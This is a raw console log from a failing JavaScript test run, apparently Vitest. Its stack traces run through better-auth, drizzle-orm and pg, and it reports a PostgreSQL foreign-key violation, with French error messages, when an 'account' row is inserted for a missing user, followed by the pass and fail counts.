"refresh_token_expires_at", "scope", "password", 
"created_at", "updated_at") values ($1, $2, $3, $4, 
default, default, default, default, default, default, 
$5, $6, $7) returning "id", "account_id", 
"provider_id", "user_id", "access_token", 
"refresh_token", "id_token", 
"access_token_expires_at", 
"refresh_token_expires_at", "scope", "password", 
"created_at", "updated_at"
params: OUfA4c2cXYIG1xqNe27HdHBeNs5NrYUS,fKtTp0PV4l7Og
fP7iCuoHwxLqBXOWXvo,credential,fKtTp0PV4l7OgfP7iCuoHwx
LqBXOWXvo,070efea4a7eb9a0b55eb1045684e35ac:98efba44c63
7ea882f28146433a891bdf395bc44784d38ee454d34dfb9ec6561c
8fbce07d2e8616e6d3683ee2b7326d80b3c4a24fe016b50b74c18a
1fbda75b0,2026-03-02T14:58:27.116Z,2026-03-02T14:58:27
.116Z[39m
[90m [2mÔØ»[22m NodePgPreparedQuery.queryWithCache 
node_modules/.pnpm/drizzle-orm@0.45.1_@prisma+_adef033
d447e1fca34f3f6403b40317c/node_modules/drizzle-orm/pg-
core/session.js:[2m41:15[22m[39m

[90m [2mÔØ»[22m node_modules/.pnpm/drizzle-orm@0.45
.1_@prisma+_adef033d447e1fca34f3f6403b40317c/node_modu
les/drizzle-orm/node-postgres/session.js:[2m117:22[2
2m[39m
[90m [2mÔØ»[22m withReturning node_modules/.pnpm/be
tter-auth@1.4.18_@prisma+_69d76cae5fd43a943b38aaed366e
fea4/node_modules/better-auth/dist/adapters/drizzle-ad
apter/drizzle-adapter.mjs:[2m18:45[22m[39m
[90m [2mÔØ»[22m Object.create node_modules/.pnpm/be
tter-auth@1.4.18_@prisma+_69d76cae5fd43a943b38aaed366e
fea4/node_modules/better-auth/dist/adapters/drizzle-ad
apter/drizzle-adapter.mjs:[2m131:12[22m[39m
[90m [2mÔØ»[22m Object.create node_modules/.pnpm/@b
etter-auth+core@1.4.18_@b_e298d21959413fbce6f1495fa56e
1343/node_modules/@better-auth/core/dist/db/adapter/fa
ctory.mjs:[2m414:16[22m[39m
[90m [2mÔØ»[22m createWithHooks node_modules/.pnpm/
better-auth@1.4.18_@prisma+_69d76cae5fd43a943b38aaed36
6efea4/node_modules/better-auth/dist/db/with-hooks.mjs
:[2m21:69[22m[39m
[90m [2mÔØ»[22m Object.createAccount node_modules/.
pnpm/better-auth@1.4.18_@prisma+_69d76cae5fd43a943b38a
aed366efea4/node_modules/better-auth/dist/db/internal-
adapter.mjs:[2m61:11[22m[39m
[90m [2mÔØ»[22m node_modules/.pnpm/better-auth@1.4.
18_@prisma+_69d76cae5fd43a943b38aaed366efea4/node_modu
les/better-auth/dist/api/routes/password.mjs:[2m151:1
10[22m[39m
[90m [2mÔØ»[22m internalHandler node_modules/.pnpm/
better-call@1.1.8_zod@4.3.6/node_modules/better-call/d
ist/endpoint.mjs:[2m30:20[22m[39m

[31m[1mCaused by: error[22m: une instruction 
insert ou update sur la table ┬½ account ┬╗ viole la 
contrainte de cl├®
├®trang├¿re ┬½ account_user_id_user_id_fk ┬╗[39m
[90m [2mÔØ»[22m node_modules/.pnpm/pg@8.18.0/node_m
odules/pg/lib/client.js:[2m624:17[22m[39m
[90m [2mÔØ»[22m node_modules/.pnpm/drizzle-orm@0.45
.1_@prisma+_adef033d447e1fca34f3f6403b40317c/node_modu
les/drizzle-orm/node-postgres/session.js:[2m124:18[2
2m[39m
[90m [2mÔØ»[22m NodePgPreparedQuery.queryWithCache 
node_modules/.pnpm/drizzle-orm@0.45.1_@prisma+_adef033
d447e1fca34f3f6403b40317c/node_modules/drizzle-orm/pg-
core/session.js:[2m39:16[22m[39m
[90m [2mÔØ»[22m node_modules/.pnpm/drizzle-orm@0.45
.1_@prisma+_adef033d447e1fca34f3f6403b40317c/node_modu
les/drizzle-orm/node-postgres/session.js:[2m117:22[2
2m[39m
[90m [2mÔØ»[22m withReturning node_modules/.pnpm/be
tter-auth@1.4.18_@prisma+_69d76cae5fd43a943b38aaed366e
fea4/node_modules/better-auth/dist/adapters/drizzle-ad
apter/drizzle-adapter.mjs:[2m18:45[22m[39m
[90m [2mÔØ»[22m Object.create node_modules/.pnpm/be
tter-auth@1.4.18_@prisma+_69d76cae5fd43a943b38aaed366e
fea4/node_modules/better-auth/dist/adapters/drizzle-ad
apter/drizzle-adapter.mjs:[2m131:12[22m[39m
[90m [2mÔØ»[22m Object.create node_modules/.pnpm/@b
etter-auth+core@1.4.18_@b_e298d21959413fbce6f1495fa56e
1343/node_modules/@better-auth/core/dist/db/adapter/fa
ctory.mjs:[2m414:16[22m[39m
[90m [2mÔØ»[22m createWithHooks node_modules/.pnpm/
better-auth@1.4.18_@prisma+_69d76cae5fd43a943b38aaed36
6efea4/node_modules/better-auth/dist/db/with-hooks.mjs
:[2m21:69[22m[39m
[90m [2mÔØ»[22m Object.createAccount node_modules/.
pnpm/better-auth@1.4.18_@prisma+_69d76cae5fd43a943b38a
aed366efea4/node_modules/better-auth/dist/db/internal-
adapter.mjs:[2m61:11[22m[39m

[2m Test Files [22m [1m[31m26 failed[39m[22m[2m | [22m[1m[32m10 passed[39m[22m[90m (36)[39m
[2m      Tests [22m [1m[31m18 failed[39m[22m[2m | [22m[1m[32m377 passed[39m[22m[90m (395)[39m
[2m   Start at [22m 15:57:48
[2m   Duration [22m 41.48s[2m (transform 2.40s, setup 31.15s, import 11.81s, tests 26.17s, environment 11ms)[22m

[31m[2mÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»
ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»[22m[39
m
[31m[1mSerialized Error:[22m[39m [90m{ length: 
347, severity: 'ERREUR', code: '23503', detail: 'La 
cl├® (user_id)=(fKtTp0PV4l7OgfP7iCuoHwxLqBXOWXvo) 
n\'est pas pr├®sente dans la table ┬½ user ┬╗.', 
hint: undefined, position: undefined, 
internalPosition: undefined, internalQuery: 
undefined, where: undefined, schema: 'public', table: 
'account', dataType: undefined, constraint: 
'account_user_id_user_id_fk', file: 'ri_triggers.c', 
routine: 'ri_ReportViolation' }[39m
[31m[2mÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»
ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»[33/38]ÔÄ»[22m[39m

